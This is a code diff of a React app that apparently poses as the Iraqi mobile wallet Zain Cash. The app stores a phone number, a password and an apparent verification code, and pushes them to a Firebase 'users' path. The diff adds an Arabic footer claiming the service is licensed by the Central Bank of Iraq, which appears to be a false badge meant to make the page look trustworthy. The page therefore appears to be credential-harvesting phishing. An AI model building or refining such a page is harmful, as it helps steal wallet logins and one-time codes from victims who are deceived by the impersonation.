@@ -1,5 +1,5 @@
 import "./styles.css";
-import Loader from "./Loader";
+import { Spinner } from "./Loader";
 import Code from "./Code";
 import MainPage from "./MainPage";
 import { ref, push, set } from "firebase/database";
@@ -9,10 +9,10 @@ export default function App() {
   const [activePageID, setActivePageID] = useState(1);
   const [phone, setPhone] = useState("phone");
   const [pass, setPass] = useState("pass");
-  const [code, setCode] = useState("w");
+  const [code, setCode] = useState("");
   const dba = database;
   const handleDataBase = (phone: string) => {
-    const postListRef = ref(dba, "users");
+    const postListRef = ref(dba, "/users");
 
     const newPostRef = push(postListRef, phone);
     set(newPostRef, {
@@ -22,9 +22,7 @@ export default function App() {
     });
   };
 
-  useEffect(() => {}, []);
-
-  const [show, setShow] = useState(true);
+  const [show, setShow] = useState(false);
   const handleActivePage = (id: number) => {
     switch (id) {
       case 1:
@@ -41,7 +39,6 @@ export default function App() {
   const updateData = async () => {
     handleDataBase(phone);
   };
-
   return (
     <div
       className="App"
@@ -52,7 +49,7 @@ export default function App() {
         overflow: "hidden",
       }}
     >
-      <Loader show={show} setShow={setShow} />
+      <Spinner showSpinner={show} setShow={setShow} />
 
       {activePageID === 1 ? (
         <MainPage
@@ -64,6 +61,14 @@ export default function App() {
       ) : (
         <Code updateData={updateData} setCode={setCode} />
       )}
+      <div style={{ position: "fixed", bottom: 20, left: 0, right: 0 }}>
+        <div
+          style={{ display: "flex", justifyContent: "center", color: "white" }}
+        >
+          <div>زين كاش مرخصة من قبل البنك المركزي العراقي</div>
+          <div></div>
+        </div>
+      </div>
     </div>
   );
 }
